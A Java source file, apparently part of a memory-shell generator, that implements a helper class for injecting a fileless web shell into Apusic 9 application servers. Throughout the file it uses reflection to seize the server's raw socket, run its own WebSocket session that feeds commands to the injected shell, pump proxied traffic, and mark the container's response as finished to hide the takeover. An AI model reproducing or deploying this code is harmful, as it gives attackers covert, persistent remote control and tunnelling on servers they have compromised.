package com.reajason.javaweb.memshell.server.apusic;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.ClosedChannelException;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;

/**
 * Apusic 9 RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code <shellClassName>$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接：
 * 从 {@code com.apusic.web.container.Request} 取出 HttpProtocol 与 Connection，绕过
 * 容器响应后直接读写连接器持有的 {@link SocketChannel}，并反射调用 shell 的协议回调。
 * <p>
 * 9.0 与 9.0.1 的 Web 容器都按请求处理线程独占连接；本类沿用其他 server 的约定，
 * 在请求线程内跑完整个 WebSocket 会话，会话结束后关闭 socket，容器随后的正常收尾
 * 只会看到已关闭的连接。
 * <p>
 * 本类只依赖 JDK（目标 JDK 6），不引用任何 servlet / Apusic 类型。
 *
 * @author ReaJason
 */
public class ApusicRawWsHelper implements Runnable {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    private static final int READ_POLL_TIMEOUT = 5000;
    private static final int IO_BUFFER_SIZE = 8192;
    private static final long WRITE_STALL_TIMEOUT = 30000;

    private final byte[] singleByte = new byte[1];
    /**
     * 已从连接读出但尚未消费的字节。按单字节读帧头时一次 select 读满内部缓冲，
     * 避免 2~10 字节的帧头触发同样次数的 selector 唤醒和 read 系统调用。
     */
    private byte[] pending;
    private int pendingIndex;
    private int pendingLength;

    private SocketChannel channel;
    private volatile Selector readSelector;
    private Object response;

    private final Object writeLock = new Object();
    private volatile boolean closed;
    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;
    private InputStream pumpInput;
    private Map attributes;
    private boolean hijacked;

    public ApusicRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（101 已决定写或已写），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        Object key = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }

        if (isTrue(invoke(request, "isSecure", new Class[0], null))) {
            return false;
        }
        Object protocol = invoke(request, "getHttpProtocol", new Class[0], null);
        Object protocolConnection = protocol == null ? null
                : invoke(protocol, "getConnection", new Class[0], null);
        if (protocolConnection == null) {
            return false;
        }
        SocketChannel socketChannel = findChannel(protocolConnection);
        if (socketChannel == null) {
            return false;
        }
        try {
            // 9.0 的 upgraded poller 与 9.0.1 的 reader 线程都要求非阻塞；这里先切好，
            // 后续由本类自己的 selector 和写循环接管。
            socketChannel.configureBlocking(false);
        } catch (Throwable ignored) {
            return false;
        }
        this.channel = socketChannel;
        this.response = response;
        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary", new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText", new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});
        this.hijacked = true;

        try {
            writeHandshake(accept);
        } catch (Throwable t) {
            closeConnection();
            return true;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        try {
            frameLoop();
        } catch (Throwable ignored) {
        } finally {
            invokeQuietly(onDisconnect, shell, new Object[]{this});
            closeConnection();
        }
        return true;
    }

    // ---------------------------------------------------------------- 连接接管

    /**
     * 9.0 的连接实现同时暴露 getSocket() 与 getChannel()，9.0.1 只有 getSocket()；
     * SSL 连接器下 Socket.getChannel() 为 null，正好放弃接管。
     */
    private static SocketChannel findChannel(Object connection) {
        Object socket = invoke(connection, "getSocket", new Class[0], null);
        if (socket instanceof Socket) {
            SocketChannel channel = ((Socket) socket).getChannel();
            if (channel != null) {
                return channel;
            }
        }
        Object channel = invoke(connection, "getChannel", new Class[0], null);
        return channel instanceof SocketChannel ? (SocketChannel) channel : null;
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWire(byte[] buffer, int offset, int length) throws IOException {
        if (length <= 0) {
            return 0;
        }
        // 帧头和掩码按单字节读取；一次 select 读满内部缓冲后再逐字节消费，
        // 否则每个字节都要 select + read 一次。payload 等大块读取直接落到调用方缓冲区。
        if (pendingIndex >= pendingLength && length == 1) {
            if (pending == null || pending.length < IO_BUFFER_SIZE) {
                pending = new byte[IO_BUFFER_SIZE];
            }
            int count = readWireDirect(pending, 0, pending.length);
            if (count <= 0) {
                return count;
            }
            pendingLength = count;
            pendingIndex = 0;
        }
        if (pendingIndex < pendingLength) {
            int count = pendingLength - pendingIndex;
            if (count > length) {
                count = length;
            }
            System.arraycopy(pending, pendingIndex, buffer, offset, count);
            pendingIndex += count;
            return count;
        }
        return readWireDirect(buffer, offset, length);
    }

    private int readWireDirect(byte[] buffer, int offset, int length) throws IOException {
        while (!closed) {
            Selector selector = readSelector();
            int selected;
            try {
                selected = selector.select(READ_POLL_TIMEOUT);
            } catch (Throwable t) {
                if (closed) {
                    return -1;
                }
                throw new IOException("select failed: " + t);
            }
            if (closed) {
                return -1;
            }
            if (selected <= 0) {
                continue;
            }
            selector.selectedKeys().clear();
            try {
                int count = channel.read(ByteBuffer.wrap(buffer, offset, length));
                if (count != 0) {
                    return count;
                }
            } catch (ClosedChannelException e) {
                return -1;
            } catch (Throwable t) {
                if (closed) {
                    return -1;
                }
                if (t instanceof IOException) {
                    throw (IOException) t;
                }
                throw new IOException("read failed: " + t);
            }
        }
        return -1;
    }

    private int readWireByte() throws IOException {
        while (!closed) {
            int count = readWire(singleByte, 0, 1);
            if (count > 0) {
                return singleByte[0] & 0xFF;
            }
            if (count < 0) {
                return -1;
            }
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length) {
            int count = readWire(buffer, offset + read, length - read);
            if (count < 0) {
                throw new IOException("unexpected EOF");
            }
            if (count == 0) {
                if (closed) {
                    throw new IOException("connection closed");
                }
                continue;
            }
            read += count;
        }
    }

    /**
     * 分块读入并解掩码 payload，避免按消息全长一次性预分配大数组；
     * 掩码按全局偏移取模，分块边界不错位。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        if (total == 0) {
            return new byte[0];
        }
        int chunkSize = Math.min(total, IO_BUFFER_SIZE);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private Selector readSelector() throws IOException {
        Selector selector = readSelector;
        if (selector != null) {
            return selector;
        }
        selector = Selector.open();
        try {
            channel.register(selector, SelectionKey.OP_READ);
        } catch (Throwable t) {
            selector.close();
            if (t instanceof IOException) {
                throw (IOException) t;
            }
            throw new IOException("register failed: " + t);
        }
        readSelector = selector;
        return selector;
    }

    private void writeWire(byte[] data, int offset, int length) throws IOException {
        ByteBuffer buffer = ByteBuffer.wrap(data, offset, length);
        // 0 字节写说明对端停止读取；加停滞死线防止持锁空转饿死 pong/close 帧
        long stallStart = -1;
        while (buffer.hasRemaining()) {
            if (closed) {
                throw new IOException("connection closed");
            }
            int count;
            try {
                count = channel.write(buffer);
            } catch (ClosedChannelException e) {
                throw new IOException("connection closed");
            }
            if (count < 0) {
                throw new IOException("connection closed");
            }
            if (count == 0) {
                if (stallStart < 0) {
                    stallStart = System.currentTimeMillis();
                } else if (System.currentTimeMillis() - stallStart > WRITE_STALL_TIMEOUT) {
                    throw new IOException("write stalled");
                }
                try {
                    Thread.sleep(1);
                } catch (InterruptedException e) {
                    throw new IOException("write interrupted");
                }
            } else {
                stallStart = -1;
            }
        }
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        Selector selector = readSelector;
        if (selector != null) {
            try {
                selector.wakeup();
            } catch (Throwable ignored) {
            }
        }
        try {
            if (channel != null) {
                channel.close();
            }
        } catch (Throwable ignored) {
        }
        try {
            if (selector != null) {
                selector.close();
            }
        } catch (Throwable ignored) {
        }
        // 会话结束后容器还会按正常请求收尾：把响应标成已结束并声明 Connection: close，
        // 容器就会走 releaseRequest(false)->abort 的路径，不写响应也不归还 keep-alive。
        // 这里不提前 abort：9.0.1 的 abort 会递减连接计数，调用两次会破坏容器统计。
        finishContainerResponse();
        this.channel = null;
        this.response = null;
    }

    private void finishContainerResponse() {
        Object servletResponse = response;
        if (servletResponse == null) {
            return;
        }
        try {
            servletResponse.getClass().getMethod("setHeader",
                    new Class[]{String.class, String.class})
                    .invoke(servletResponse, new Object[]{"Connection", "close"});
        } catch (Throwable ignored) {
        }
        Object output = invoke(servletResponse, "getOutputStream", new Class[0], null);
        if (output == null) {
            return;
        }
        Class<?> clazz = output.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field finished = clazz.getDeclaredField("finished");
                finished.setAccessible(true);
                finished.setBoolean(output, true);
                return;
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return;
            }
        }
    }

    // ---------------------------------------------------------------- 协议

    private void writeHandshake(String accept) throws IOException {
        String responseText = "HTTP/1.1 101 Switching Protocols\r\n"
                + "Upgrade: websocket\r\n"
                + "Connection: Upgrade\r\n"
                + "X-Accel-Buffering: no\r\n"
                + "Sec-WebSocket-Accept: " + accept + "\r\n"
                + "\r\n";
        byte[] data = responseText.getBytes(UTF8);
        synchronized (writeLock) {
            writeWire(data, 0, data.length);
        }
    }

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int hi = readWireByte();
                    int lo = readWireByte();
                    if (hi < 0 || lo < 0) {
                        return;
                    }
                    length = (hi << 8) | lo;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int b = readWireByte();
                        if (b < 0) {
                            return;
                        }
                        length = (length << 8) | b;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    if (message.length == 1) {
                        // RFC 6455 §5.5：Close body 要么为空，要么至少 2 字节状态码
                        closeWith(1002, "invalid close body");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    closeConnection();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                writeWire(header, 0, header.length);
                writeWire(data, 0, data.length);
            } catch (Throwable t) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        closeConnection();
    }

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
     * 为 Proxy 壳提供目标端到客户端的异步泵送。帧循环占用当前请求线程，
     * 与 Tomcat helper 一致；本类的 Runnable 身份留给泵线程。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        InputStream targetInput = pumpInput;
        if (targetInput == null) {
            return;
        }
        byte[] buffer = new byte[8192];
        try {
            while (!closed) {
                int count = targetInput.read(buffer);
                if (count == -1) {
                    break;
                }
                if (count > 0) {
                    byte[] data = new byte[count];
                    System.arraycopy(buffer, 0, data, 0, count);
                    sendBinary(data);
                }
            }
        } catch (Throwable ignored) {
        }
        closeWith(1000, null);
    }

    // ---------------------------------------------------------------- 反射工具

    private static boolean isTrue(Object value) {
        return value instanceof Boolean && ((Boolean) value).booleanValue();
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (InvocationTargetException e) {
            return null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String base64Encode(byte[] data) {
        try {
            Class<?> base64Class = Class.forName("java.util.Base64");
            Object encoder = base64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, new Object[]{data});
        } catch (Throwable ignored) {
        }
        try {
            Class<?> encoderClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = encoderClass.newInstance();
            String value = (String) encoderClass.getMethod("encode", byte[].class)
                    .invoke(encoder, new Object[]{data});
            return value.replace("\n", "").replace("\r", "");
        } catch (Throwable ignored) {
            return null;
        }
    }
}
